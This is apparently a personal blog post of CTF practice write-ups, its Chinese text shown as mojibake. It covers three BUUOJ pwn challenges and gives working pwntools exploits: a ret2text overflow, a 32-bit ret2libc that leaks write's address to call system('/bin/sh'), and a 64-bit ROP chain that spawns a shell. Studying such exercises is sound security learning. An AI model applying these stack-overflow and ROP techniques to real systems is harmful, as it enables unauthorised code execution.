---
title: æš‘æœŸç¬¬ä¸€å‘¨åˆ·é¢˜
date: 2023-07-13 20:14:37
tags:
---
## get_started_3dsctf_2016

ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ret2textæ¿å­é¢˜ï¼ˆé‚£ä¹ˆå¤§ä¸ª`get_flag`å‡½æ•°ï¼‰ã€‚ç…§æ¿å­å†™ï¼Œæ‰“è¿œç¨‹ï¼Œæ²¡å›æ˜¾ï¼ŒæŠ¥é”™ã€‚æ£€æŸ¥å‘ç°å‡½æ•°çš„è¿”å›æ–¹å¼ä¸æ˜¯`leave retn`è€Œæ˜¯`retn`ï¼Œé‚å°†fake_ebpçš„paddingå»é™¤ã€‚æ²¡æ‰“é€šã€‚ç¿»ç½‘ä¸Šçš„é¢˜è§£ï¼Œå‘ç°æœ‰å¸ˆå‚…æåˆ°è¿™é¢˜çš„è¿œç¨‹åªæœ‰ç¨‹åºèƒ½æ­£å¸¸é€€å‡ºçš„æ—¶å€™æ‰æœ‰å›æ˜¾ï¼ˆç¡®å®æ˜¯è€é¢˜äº†ï¼Œè¿™å‡ å¹´çš„æ–°é¢˜ä¸ä¼šè¿™ä¹ˆç¦»è°±ğŸ˜…ï¼‰ã€‚é‚å°†`get_flag`å‡½æ•°çš„è¿”å›åœ°å€è®¾ç½®ä¸º`elf.sym["exit"]`ã€‚`get_flag`å‡½æ•°å¼€å¤´æœ‰ä¸€ä¸ªifåˆ¤æ–­ï¼š

![a](2023-07-06-23-06-37-image.png)

åŸå§‹æ€è·¯æ˜¯ç›´æ¥ret2textçš„æ—¶å€™è¶Šè¿‡ifåˆ¤æ–­ï¼Œæ³¨æ„åˆ°æ±‡ç¼–ä¸­æ­¤å‡½æ•°åœ¨`retn`å‰æœ‰`pop esi`ï¼Œå‡½æ•°å¼€å¤´æœ‰`push esi`ï¼Œæƒ³æ³•æ˜¯æŠŠæ ˆæ„é€ æˆä¸‹é¢è¿™æ ·:

| stack_overflow_paddingÂ  0x38             |
| ---------------------------------------- |
| ret2txet_addr(after elf.sym["get_flag"]) |
| fake_pop_esi                             |
| elf.sym["exit"]                          |

ä¸çŸ¥ä¸ºä½•æ‰“ä¸é€šã€‚è€è€å®å®è¿‡ifåˆ¤æ–­ï¼š

| stack_overflow_paddingÂ  0x38 |
| ---------------------------- |
| elf.sym["get_flag"]          |
| elf.sym["exit"]              |
| get_flag arg1Â 0x308CD64F     |
| get_flag arg2Â 0x195719D1     |

æœ€åexpå¦‚ä¸‹ï¼š

```python
from pwn import *

context.log_level = "debug"
context.arch = "i386"
elf = ELF("./get_started_3dsctf_2016")
# p = process("./get_started_3dsctf_2016")
p = remote("node4.buuoj.cn", 27999)
sleep(1)
p.send(
    b"a" * 0x38
    + p32(elf.sym["get_flag"])
    + p32(elf.sym["exit"])
    + p32(0x308CD64F)
    + p32(0x195719D1)
)
p.interactive()
```

## [OGeek2019]babyrop

32ä½ret2libcï¼Œ`write`æ³„éœ²ï¼Œè¿™é¢˜å› ä¸º`send`å’Œ`sendline`çš„åŸå› å¡äº†å¥½ä¹…ï¼Œä¸‹æ¬¡å†™è„šæœ¬å‡†å¤‡å…ˆæ— è„‘ä¸Š`sendline`äº†

è„šæœ¬å¦‚ä¸‹ï¼š

```python
from pwn import *

context.log_level = "debug"
context.arch = "i386"
# p = process("./pwn")
p = remote("node4.buuoj.cn", 26926)
elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")
p.sendline(b"\x00" + b"\xff" * 7)
p.recvuntil(b"Correct\n")
p.sendline(
    b"a" * (0xE7 + 4)
    + p32(elf.plt["write"])
    + p32(0x08048825)  # main
    + p32(1)
    + p32(elf.got["write"])
    + p32(4)
)
write_addr = u32(p.recv(4))
libc_base = write_addr - libc.sym["write"]
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + libc.search(b"/bin/sh").__next__()
p.sendline(b"\x00" + b"\xff" * 7)
p.recvuntil(b"Correct\n")
p.sendline(b"a" * (0xE7 + 4) + p32(system_addr) + p32(0xDEADBEEF) + p32(binsh_addr))
p.interactive()
```

## [HarekazeCTF2019]baby_rop

64ä½ropæ¿å­é¢˜ã€‚æ³¨æ„ç¨‹åºé‡Œæœ‰`/bin/sh`å­—ç¬¦ä¸²ï¼Œå¯ä»¥åœ¨idaçš„stringsé¡µé¢æ‰¾åˆ°ã€‚è¿œç¨‹flagçš„ä½ç½®å¾ˆæ€ªå•Šï¼Œå­¦ä¹ äº†ä¸€ä¸‹`find`å‘½ä»¤ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿œç¨‹äº¤äº’çš„æ—¶å€™è¿‡æ²¡å‡ ç§’æ²¡æ“ä½œå°±ä¼šeof

expå¦‚ä¸‹ï¼š

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
# p = process("./babyrop")
p = remote("node4.buuoj.cn", 26515)
elf = ELF("./babyrop")
pop_rdi = 0x400683
p.sendlineafter(
    b"What's your name? ",
    b"A" * 0x10
    + b"B" * 8
    + p64(pop_rdi)
    + p64(elf.sym["binsh"])
    + p64(elf.plt["system"]),
)
p.interactive()

```
